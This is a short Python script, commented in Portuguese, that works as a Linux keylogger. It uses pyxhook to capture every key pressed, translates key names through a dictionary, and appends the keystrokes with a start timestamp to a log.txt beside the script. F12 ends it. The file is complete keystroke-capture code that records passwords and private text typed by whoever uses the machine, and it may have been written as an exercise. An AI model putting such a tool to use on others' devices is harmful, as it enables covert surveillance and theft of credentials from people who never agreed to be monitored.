import pyxhook
import sys # sys.exit
from datetime import datetime
from pathlib import Path

# Dicionário com valores a serem modificados em event.Key por conta do tipo de 
# keyboard, é uma solução paliativa.
# Modificar key_code/keysym em pyxhook deve resolver.
dict_key = {
        '[65105]':'´', 'space':' ', 'Escape':'[Esc]',
        'apostrophe':"'", 'Tab':'[Tab]', 'Caps_Lock': '[Caps_Lock]',
        'Super_L':'[WinKey_L]', 'backslash':'\\', 'Super_R':'[WinKey_R]',
        'slash':'/', 'semicolon':';', 'period':'.', 'comma':',',
        'ccedilla':'ç', 'bracketleft':'[', 'bracketright':']', '[65107]':'~',
        'BackSpace':'[BackSpace]', 'Return':'[Enter]', 'quotedbl':'"',
        'exclam':'!', 'at':'@', 'numbersign':'#', 'dollar':'$', 'percent':'%',
        '[65111]':'¨', 'ampersand':'&', 'asterisk':'*', 'parenleft':'(',
        'parenright':')', 'minus':'-', 'equal':'=', 'underscore':'_',
        'plus':'+', 'braceleft':'{', 'braceright':'}', 'greater':'>',
        'colon':':', 'question':'?', 'P_Subtract':'-', 'P_Add':'+',
        'P_multiply':'*', 'P_Divide':'/', 'P_Decimal':'.', 'P_Enter':'[Enter',
        'bar':'|', 'Up':'[Up]', 'Right':'[Right]', 'Left':'[Left]',
        'Down':'[Down]', 'F1':'[F1]', 'F2':'[F2]', 'F3':'[F3]', 'F4':'[F4]',
        'F5':'[F5]', 'F6':'[F6]', 'F7':'[F7]', 'F8':'[F8]', 'F9':'[F9]',
        'F10':'[F10]', 'F11':'[F11]', 'F12':'[F12]', 'Control_L':'[Ctrl_L]',
        'Control_R':'[Ctrl_R]', 'Shift_L':'[Shift_L]', 'Shift_R':'[Shift_R]',
        'Alt_L':'[Alt_L]', '[65027]':'[Alt_R]'
        }

file_path = Path(__file__).parent / 'log.txt' # Path do log, o mesmo do script.

# Insere data no log ao iniciar script
with open(file_path, 'a') as file:
    date = datetime.today().strftime('%d-%m-%Y--%H:%M:%S')
    file.write(f'\n{date}..:\n')

# Função principal
def main():

    # Função interna que escreve a tecla do evento em log.txt
    def write_event(event):

        # Modifica tecla de acordo com o dict global
        if event.Key in dict_key:
            event.Key = dict_key[event.Key]
    
        # Guarda tecla em um .txt
        with open(file_path, 'a') as file:
            file.write(event.Key)

        # Se F12 for pressionado, o script é finalizado
        if event.Key == '[F12]':
            hm.cancel
            sys.exit(0)

    hm = pyxhook.HookManager()  # Instancia a classe que gerencia eventos hook 
    hm.KeyDown = write_event  # Atribui nossa função como callback do evento
                                      # iniciado quando uma tecla é pressionada
    hm.start()  # Inicia processos de threads (herdado de threading por pyxhook

    
if __name__ == "__main__":
    main()